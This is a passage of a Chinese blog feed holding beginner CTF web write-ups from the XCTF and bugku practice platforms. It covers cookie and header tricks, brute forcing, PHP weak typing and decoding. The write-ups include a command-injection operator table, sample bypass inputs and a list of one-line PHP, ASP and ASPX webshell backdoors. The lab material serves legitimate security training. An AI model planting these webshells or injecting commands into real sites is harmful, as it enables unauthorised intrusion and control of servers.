class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        body&#123;</span><br><span class="line"><span class="css">            <span class="selector-tag">margin-left</span><span class="selector-pseudo">:auto</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin-right</span><span class="selector-pseudo">:auto</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">margin-TOP</span><span class="selector-pseudo">:200PX</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">width</span><span class="selector-pseudo">:20em</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>你知道index.php的备份文件名吗？<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag">$<span class="attr">flag</span>=<span class="string">&quot;Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;&quot;</span></span></span><br><span class="line"><span class="tag">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<br>
<p>本题也可使用目录遍历搜索</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Y2LMCC%25TTM%5D%7BJ474Q3N42%5BD.png" alt=""></p>
<p>感觉自己是不是有点厉害了现在,操练起兵器，我们继续闯关，冲冲冲~</p>
<h2 id="cookie"><a class="header-anchor" href="#cookie">¶</a>cookie</h2>
<hr>
<p>此关提示我们信息在cookie中</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/U1SU0%29T8J378V4ULADE%5DAL5.png" alt=""></p>
<br>
<p>去查看文件的请求头和响应头信息</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%2450CQV6YEE5P%40%28SH%29_GUBCQ.png" alt=""></p>
<br>
<p>提示我们去查看cookie.php，我们去访问这个文件，让我们继续看文件响应头</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/N%28OZ%25%7D57V5%7BB_9J%7DJ%28N5K%28J.png" alt=""></p>
<br>
<p>打开文件查看响应头，gogogo！</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/9W43RJ_R%25UC%7D3W%408%28%24DROGI.png" alt=""></p>
<br>
<p>flag就出现在了我们面前，金币++，开心~</p>
<h2 id="disabled-button"><a class="header-anchor" href="#disabled-button">¶</a>disabled_button</h2>
<hr>
<p>题目提示页面按钮不能打开，点击了发现确实打不开</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/0QDTUEI%5DW3HBBG_VJKPY%60~S.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/%5D608EGFTAJL%29U%24AOJALE4%5BX.png" alt=""></p>
<br>
<p>这时候运用到我们html的知识，前台万物可更改！我们打开源码修改属性，把disabled去掉，按钮即可打开</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/2F%40%40E_S6P5JDKK%7B~0%60%609BL1.png" alt=""></p>
<br>
<p>点击后，flag就出现啦~</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/disabled_button/17LAH%25%7B9QR%60%7DB%24F%7BSGZ5BMD.png" alt=""></p>
<h2 id="weak-auth"><a class="header-anchor" href="#weak-auth">¶</a>weak_auth</h2>
<hr>
<p>本题提示为弱密码爆破</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/7O1MJB2%607W_M~F%60QVKQ4SLL5.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/YU%60V%60%7B9Y16XM%5BY1Y%28%5B4FZF7.png" alt=""></p>
<br>
<p>我们尝试抓包查看源代码，发现提示我们用户名为admin，使用密码爆破</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/%24R_D76HB0S%409GL%24RMWZ50FM.png" alt=""></p>
<br>
<p>我们使用字典配合burpsuite进行一个爆破，最后得到结果~，在响应包里拿到flag</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/VD2TF%7BN%5DP%60F47D%40%7DZI9%60EG8.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/weak_auth/NA9%25KLH%29H95R14I0E%28%243X46.png" alt=""></p>
<h2 id="command-execution"><a class="header-anchor" href="#command-execution">¶</a>command_execution</h2>
<hr>
<p>本题给了我们一个ping页面，我们尝试ping了本机地址之后回显信息</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/RY~GME%5DY0S%7BCWA11S%28%24KUYE.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/881NMO91RVEV%29%7BO4%5D%29L%7DKTC.png" alt=""></p>
<br>
<p>页面回显ping -c 3 127.0.0.1 ，这里提示我们这是linux系统，ping三次。我们尝试使用linux命令执行，同时执行多条命令，发现有回显</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/%7BPQ%7DQ33TMU1UC%297_%25UL3%5BQC%20%281%29.png" alt=""></p>
<br>
<p>于是我们尝试寻找带有flag的文件~，可以用；多条执行也可以使用|只执行后面的语句</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/F8F%60R%7DHS%5B_J8UDX%28IQE0%5B26.png" alt=""></p>
<br>
<p>发现flag.txt可疑文件，我们去查看一下</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/command_execution/_M4D~KMQ~K%7D%7BKET0TJSEQ31.png" alt=""></p>
<p>轻轻松松获得flag咯~</p>
<br>
<p><strong>扩充知识：</strong></p>
<table>
<thead>
<tr>
<th><strong>常见连接符</strong></th>
<th><strong>举例</strong></th>
<th><strong>效果</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>;</td>
<td>A;B</td>
<td>先执行A，再执行B</td>
</tr>
<tr>
<td>&amp;</td>
<td>A&amp;B</td>
<td>简单拼接，A B之间无制约关系</td>
</tr>
<tr>
<td>|</td>
<td>A|B</td>
<td>显示B的执行结果</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>A&amp;&amp;B</td>
<td>A执行成功，然后才会执行B</td>
</tr>
<tr>
<td>||</td>
<td>A||B</td>
<td>A执行失败，然后才会执行B</td>
</tr>
</tbody>
</table>
<h2 id="simple-php"><a class="header-anchor" href="#simple-php">¶</a>simple_php</h2>
<hr>
<p>本题需要我们掌握php弱类型比较，打开环境给出我们一些源码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/W%7DIBQVLJ20X%7BPN4H%5BOWVT5S.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/XYN%25%7B%60Q%5BS31GMA4%29B41AA%256.png" alt=""></p>
<p>首先我们分析一下源代码：</p>
<p>1）有include函数，包含了config.php文件</p>
<p>2）url需要接收参数a和参数b</p>
<p>3）如果$a=0或者$a为真,输出$flag1</p>
<p>4）如果b是数字或者字符串，如果$b&gt;1234就输出$flag2</p>
<br>
<p>总结，我们构造a参数得等于0且不为假，构造b参数&gt;1234且不能为数字和字符串。</p>
<p>粗略来看，这不是难为我们吗！!不过兄弟莫慌，这个时候我们想起前面所说的php弱类型比较，那这弱类型到底指的什么呢？下面我们一起学习一下~</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">掌握php弱类型比较</span><br><span class="line">php中其中两种比较符号:</span><br><span class="line">&#x3D;&#x3D;：先将字符串类型转化成相同，再比较</span><br><span class="line">&#x3D;&#x3D;&#x3D;：先判断两种字符串的类型是否相等，再比较</span><br><span class="line">字符串和数字比较使用&#x3D;&#x3D;时,字符串会先转换为数字类型再比较</span><br><span class="line">var_dump(&#39;a&#39; &#x3D;&#x3D; 0);&#x2F;&#x2F;true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0</span><br><span class="line">var_dump(&#39;123a&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;true，这里&#39;123a&#39;会被转换为123</span><br><span class="line"></span><br><span class="line">var_dump(&#39;a123&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。</span><br><span class="line">举例：</span><br><span class="line">var_dump(&#39;123a1&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;true</span><br><span class="line">var_dump(&#39;1233a&#39; &#x3D;&#x3D; 123);&#x2F;&#x2F;false</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看完之后，是不是突然恍然大悟！所以我们尝试构造<strong>a=0a&amp;b=1234a</strong>输入</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_php/DE5%7D3O9%5B%40%40BTDQN%25O%5BSF%7BXU.png" alt=""></p>
<br>
<p>如此，取flag如探囊取物~</p>
<h2 id="get-post"><a class="header-anchor" href="#get-post">¶</a>get_post</h2>
<hr>
<p>这道题很简单，就是让我们发送get请求和post请求。</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/M%5DGS%5BG%60AJ%7D6A_5J%29L%25LKYZR.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/%40%29FMD3S1_I~%25QUZ~%40AK6%5B%7DI.png" alt=""></p>
<br>
<p>首先提示我们需要对他发送一个get请求，我们构造a=1进行发送get请求，然后返回结果</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/KHYZ%25IH3%28%600JE%40WMM%28PIVCU.png" alt=""></p>
<br>
<p>我们再用curl发送post请求，也可使用其他工具，这里使用windows自带的curl。不懂curl如何使用的兄弟可移步到我的另一篇博文</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/get_post/H6LU%60WBN%5DX2ZGGFUCM3~60V.png" alt=""></p>
<br>
<p>返回的结果中含有flag，ok，此题通关！</p>
<h2 id="xff-referer"><a class="header-anchor" href="#xff-referer">¶</a>xff_referer</h2>
<hr>
<p>题目告诉我们是xff_referer，猜测是与xff和referer相关，打开环境看看</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/3N%5DA%7D%5DDIH~K4SN8%5B%299CDX0Y.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/A_0D%40SG%28AGK0VCPC1%401N~UE.png" alt=""></p>
<br>
<p>我们先学习一下xff和referer的知识：</p>
<p>（1）<strong>X-Forwarded-For:</strong>  简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。xff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</p>
<p>（2）<strong>HTTP Referer:</strong>  是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是<em>从哪个页面链接过来</em>的，服务器基此可以获得一些信息用于处理。referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</p>
<br>
<p>我们先设置xff为123.123.123.123发送请求包，查看包信息</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/PQ7F0J%5BF%5BQ1IFZ%605C%29_4PV2.png" alt=""></p>
<br>
<p>提示我们地址必须来自https://www.google.com</p>
<p>所以我们加上referer信息</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/6TO%40YJZ5U~~H1O_Z3%40%24X%7DP5.png" alt=""></p>
<p>发现响应包里含有flag，成功！这道题还可以使用我们强大的curl命令行工具</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/M9MHWII6E%2841I0Y8Z%7BB%7DQPW.png" alt=""></p>
<h2 id="webshell"><a class="header-anchor" href="#webshell">¶</a>webshell</h2>
<hr>
<p>这道题考的是webshell，诶，你不知道什么是webshell吗？webshell就是web下的shell ，也就是web网站的后门。</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/%5D3B~6AJ6BIRTDI62TL%5BH9PY.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/FW8AU7XJALI0HR1%29RZ4%7B%7BQW.png" alt=""></p>
<p>页面已经给出我们shell，也是常用的php一句话木马</p>
<p>同时常用的一句话木马有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
<p>给出连接密码webshell，那我们直接蚁剑连接就好</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/Z5%25II2N4%254R~%29R8DY~%405AN4.png" alt=""></p>
<p>然后连接到后台，在里面找到flag文件，打开获取flag即可~</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/%5DS%244%25EXCQ1PS03D%5B%7DCP5%7DDL.png" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/Z5%25II2N4%254R~%29R8DY~%405AN4.png" alt=""></p>
<h2 id="simple-js"><a class="header-anchor" href="#simple-js">¶</a>simple_js</h2>
<hr>
<p>打开题目，题目名字告诉我们和js有关，这让我着实慌了一会，因为我对js没有怎么去学过。</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/%28A4HX0%24I98LMS1_M%60%5BD2OEA.png" alt=""></p>
<p>打开页面后弹出一个输入密码的框，乱输一阵，哈哈嗝。</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/ZX%40BKAX1E%7DD3IZWJ%25%25DQ4IM.png" alt=""></p>
<p>返回一段英文，显示告诉我们这是假密码，我们去找一下有没有东西，诶，发现了！我们尝试审计一下代码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/K%25%29ZR5%25N%24XC236QA~5FVBMB.png" alt=""></p>
<p>发现定义了一些参数和好像有点多余的for循环，好吧，有点迷，最后一个弹窗也是和前面定义的参数毫无关系。不过发现有个可疑的变量和dechiffre后面跟着的字符串。尝试解码一下pass，这变量名字不错，希望有点用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    print(chr(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/SD%28%5D9%60%7BB%25WGN1%5DS2_%288H8JT.png" alt=""></p>
<p>解码得到弹框的提示消息，那我们再解一下下面那一串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span></span><br><span class="line">s_list = string.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s_list:</span><br><span class="line">    i = chr(int(i))</span><br><span class="line">    res += i</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<p>看起来不像是什么加密的结构，这让我有点迷。淦，忽然想起来前面题目开始就提示我们flga结构，于是拿着字符串去构造了一下flag提交，Cyberpeace{786OsErtk12}，发现居然成功了~</p>
<h1>高手进阶区</h1>
<h2 id="baby-web"><a class="header-anchor" href="#baby-web">¶</a>baby_web</h2>
<hr>
<p>有点激动，终于到高手web进阶区了，慢慢走向高手的路了是不是？好吧好吧，不吹了，来看看题目</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/2QD4IVBA_IZPP_%2425STG%28%28N.png" alt=""></p>
<p>题目提示我们是初始页面，打开是一个1.php，尝试输入了一下index.php,发现存在这个页面，但302跳转了</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/VC70ZU3IO_B8ZM7Q%28~93O%5DX.png" alt=""></p>
<p>然后使用curl请求一下，curl工具默认不随着302跳转</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/HY40G4%601ZEH%7DEGO2EN%25~498.png" alt=""></p>
<p>flag就出来了，妥妥的签到题呀哈哈嗝。</p>
<p>后来发现其实刚开始就已经给出flag了，汗！</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/YY4%24SZRJG~%7DGSJ%5DHWPE~6XO.png" alt=""></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku平台web题目（新手推荐）</title>
    <url>/posts/55334/</url>
    <content><![CDATA[<ol>
<li>
<h2 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h2>
<p>打开页面，是一群会动的滑稽，还越动越快，哈哈哈</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web2/6YPR%25%7B%40PNPA%5BNUEN%7BBW6VGQ.png" alt=""></p>
<p>好啦，看起来页面给不出什么有用的信息，我们查看一下源代码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web2/7%60CZ6H%24XMN37HSV%40%5BKG%40%60YW.png" alt=""></p>
<p>发现flag，通关！</p>
</li>
<li>
<h2 id="计算器"><a class="header-anchor" href="#计算器">¶</a>计算器</h2>
<p>进入环境后，发现给出一串数字计算，但怎么也输入不了超过两位数的数字，只能输入一位</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/R%60T%5B%60G~%24KK_4G73~~FWC%40YY.png" alt=""></p>
<p>猜测是前端限制，打开后，修改1数值为2，就可以输入两位数字了，然后提交获取flag</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/%28RKID%60YAVX1ZTCXS9%7B3%7D~KU.png" alt=""></p>
<p>当然，还有另一种方法，就是去找他的js文件，找了一下，发现flag了</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/51MY%5B%7DSCM%29%60XKFO4SI8Z3%7DM.png" alt=""></p>
</li>
<li>
<h2 id="GET"><a class="header-anchor" href="#GET">¶</a>$_GET</h2>
<p>看题目也知道是get方式发送请求，打开后看页面给出的代码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/get/UZAL7ME3%7BJQ7OQ%7BCE1VC193.png" alt=""></p>
<p>查看代码，告诉我们传参给what，当传的参数值为flag，输出flag</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/get/YINKR%28%29%7BP6602C3PPQ%60C%7B15.png" alt=""></p>
<p>ok,获取到flag。</p>
</li>
<li>
<h2 id="POST"><a class="header-anchor" href="#POST">¶</a>$_POST</h2>
<p>这次要求我们使用post方式传参</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/post/J%7B4QX%29%5DODJBTH%257%25PJZVRH2.png" alt=""></p>
<p>和上道题目一样，需要对what参数传参flag回显答案，但我们不是使用get方式，而是使用post方式进行请求</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/post/UI%259OG4%7D99JEQ%7D4QQB%24U_S1.png" alt=""></p>
<p>回显flag，通关。</p>
</li>
<li>
<h2 id="矛盾"><a class="header-anchor" href="#矛盾">¶</a>矛盾</h2>
<p>打开题目，查看给出的代码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%9F%9B%E7%9B%BE/WM9ZE87%29%7BBW9%25ERIN9%7BW%248Y.png" alt=""></p>
<p>依然用get方式对参数num传值，但这次多了一个<strong>is_numeric()函数</strong>和一个<strong>if判断</strong>。</p>
<blockquote>
<p>isnumeric( )还是一个很实用的函数，在算法题目里面应该会有比较大的作用。</p>
<p>检测字符串是否只由数字组成，如果字符串中只包括数字，就返回Ture，否则返回False。</p>
</blockquote>
<p>同时我们还需要知道php的弱类型比较，例如’123a’会被转换成’123’,字符串的开头部分决定了它的值。如果该字符串以合法的数字开始，则使用该数字至和他连续的最后一个数字结束，否则其比较时整体值为0。</p>
<p>所以我们既要满足第一个不是纯数字又要数值上等于1</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E7%9F%9B%E7%9B%BE/OO%7D2%40M0%4076CCULY%5D3GNA%40QL.png" alt=""></p>
<p>成功，获取flag。</p>
</li>
<li>
<h2 id="web3"><a class="header-anchor" href="#web3">¶</a>web3</h2>
<p>打开题目环境，有一个弹框，一直点都一直弹出，f12点不开开发者工具，所以我们直接url请求查看源代码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web3/%25WTF6%5D64VA%2846%5DGK7~%5B6%7BAM.png" alt=""></p>
<p>拉到底下，发现一串unicode编码</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web3/S3AKL%5BJ%40%296T%25Z%5BWB8CAS7IC.png" alt=""></p>
<p>把它转成Ascii码即可解密获取flag呦</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web3/K%7DOPCINA9JMUUT6NFY1IT71.png" alt=""></p>
</li>
<li>
<h2 id="域名解析"><a class="header-anchor" href="#域名解析">¶</a>域名解析</h2>
<p>题目提示我们解析域名</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/HK%5DCS7TD%60%5BU9_SC%60H3%28%7B%25FE.png" alt=""></p>
<p>按照题目要求把flag.baidu.com解析到123.206.87.240，所以我们在本地的hosts文件里写入</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/%5D4%28BG%28N5%7DD%28Y%40KWWD~ISX~B.png" alt=""></p>
<p>再访问flag.baidu.com即可得到flag</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/BC%5BB1EG9A%5D%7BSO%28%5DTKKV%605Z7.png" alt=""></p>
</li>
<li>
<h2 id="你必须让他停下"><a class="header-anchor" href="#你必须让他停下">¶</a>你必须让他停下</h2>
<p>打开页面，是一个不停刷新的画面</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B%E6%9D%A5/_J5%28NO03FKQI%5BU%5D%7B0QOIL1L.png" alt=""></p>
<p>仔细观察了一下，发现有一次请求中源代码会显示出flag，所以我们使用burpsuite抓包，然后进行若干次发送请求</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B%E6%9D%A5/WLO9%24%5B0%40N%7D96OW%5B%25F%60Q626H.png" alt=""></p>
<p>在请求图片名字为10的时候，暴露出flag。</p>
</li>
<li>
<h2 id="本地包含"><a class="header-anchor" href="#本地包含">¶</a>本地包含</h2>
<p>题目环境打不开，可能平台出问题了，暂时跳过…</p>
</li>
<li>
<h2 id="变量1"><a class="header-anchor" href="#变量1">¶</a>变量1</h2>
<p>打开题目，给出php代码，我们进行一波代码审计</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%8F%98%E9%87%8F1/TID%7DDC4B%283WM90Y_%5D%60DLX2X.png" alt=""></p>
<p>首先需要对args用get方式进行一个传参，第一个if里面含有正则，对一些字符进行了一个过滤，还发现下面<strong>var_dump</strong>里的变量有两个$$，这是一个可变变量。</p>
<blockquote>
<p>可变变量是一种独特的变量，它允许动态改变一个变量名称。其工作原理是该变量的名称由另一个变量的值来确定，实现过程就是在变量的前面再多加一个美元符号“$”.</p>
</blockquote>
<p>所以我们需要对args传一个变量的值，通过var_dump来显示它的信息，php中的全局变量有以下几种</p>
<blockquote>
<ul>
<li>$_POST [用于接收post提交的数据]</li>
<li>$_GET [用于获取url地址栏的参数数据]</li>
<li>$_FILES [用于文件就收的处理img 最常见]</li>
<li>$_COOKIE [用于获取与setCookie()中的name 值]</li>
<li>$_SESSION [用于存储session的值或获取session中的值]</li>
<li>$_REQUEST [具有get,post的功能，但比较慢]</li>
<li>SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都</li>
<li>$GLOBALS [一个包含了全部变量的全局组合数组]</li>
<li>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</li>
</ul>
</blockquote>
<p>我们这里使用GLOBALS全局变量进行构造</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/%E5%8F%98%E9%87%8F1/EW%7BSV%7B4D%29ZL3L~CLXXN4M%25Q.png" alt=""></p>
<p>ok，回显出flag。</p>
</li>
<li>
<h2 id="web5"><a class="header-anchor" href="#web5">¶</a>web5</h2>
<p>打开页面提示是jsfuck加密</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web5/S%24E92B%60%7BE%24X%29T1UC%28%400H%24FG.png" alt=""></p>
<p>没有什么有用的信息，我们查看源代码，发现一堆编码出现在我们面前</p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/bugku/web5/G%2444%402T5FQDV%25%7DF8OY%28M1AS.png" alt=""></p>
<p>jsfuck其实是一串js代码，经过了特殊的编写方式，把包含的字符做到极致，最后只剩下 ()+[]!  这六个字符。</p>
